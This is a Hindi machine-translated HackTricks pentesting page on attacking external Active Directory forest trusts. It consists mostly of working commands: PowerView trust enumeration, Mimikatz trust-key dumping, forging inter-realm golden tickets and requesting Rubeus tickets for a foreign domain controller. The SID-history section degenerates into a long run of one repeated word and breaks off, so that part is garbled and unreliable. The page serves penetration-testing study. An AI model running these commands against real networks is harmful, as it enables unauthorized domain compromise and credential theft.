# बाहरी वन डोमेन - एकतरफा (इनबाउंड) या द्विपक्षीय

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>

इस स्थिति में एक बाहरी डोमेन आप पर विश्वास कर रहा है (या दोनों एक दूसरे पर विश्वास कर रहे हैं), इसलिए आप उस पर कुछ प्रकार का पहुंच प्राप्त कर सकते हैं।

## जांच

सबसे पहले, आपको **विश्वास** की **जांच** करनी होगी:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
पिछले जांच में पाया गया कि उपयोगकर्ता **`crossuser`** **`External Admins`** समूह में हैं जिसके पास **एडमिन एक्सेस** है **बाहरी डोमेन के DC** में।

## प्रारंभिक पहुंच

यदि आपको दूसरे डोमेन में अपने उपयोगकर्ता का कोई **विशेष** एक्सेस नहीं मिला है, तो आप फिर से AD Methodology में जा सकते हैं और **अनप्रिविलेज्ड उपयोगकर्ता से प्राइवेसीकरण** का प्रयास कर सकते हैं (जैसे कि kerberoasting आदि):

आप **Powerview functions** का उपयोग करके `-Domain` पैरामीटर का उपयोग करके **अन्य डोमेन** की **जांच** कर सकते हैं, जैसे:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## अनुकरण

### लॉगिन करना

एक नियमित तरीके का उपयोग करके बाहरी डोमेन तक पहुंच के लिए उपयोगकर्ताओं के क्रेडेंशियल के साथ लॉगिन करने के बाद, आपको इसका उपयोग करने में सक्षम होना चाहिए:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID इतिहास का दुरुपयोग

आप एक वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

आप **विश्वसनीय** कुंजी के साथ **साइन कर सकते हैं** वर्तमान डोमेन के उपयोगकर्ता की **TGT अनुकरण** करने के लिए।
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### उपयोगकर्ता की पूर्ण तरीके से अनुकरण करना

To impersonate a user completely, follow these steps:

1. Obtain the user's credentials, such as username and password.
2. Use the obtained credentials to authenticate as the user.
3. Gain access to the user's session or environment.
4. Perform actions on behalf of the user within their session or environment.

By following these steps, you can fully impersonate a user and perform actions on their behalf.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **फॉलो** करें या **Twitter** पर [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके।

</details>
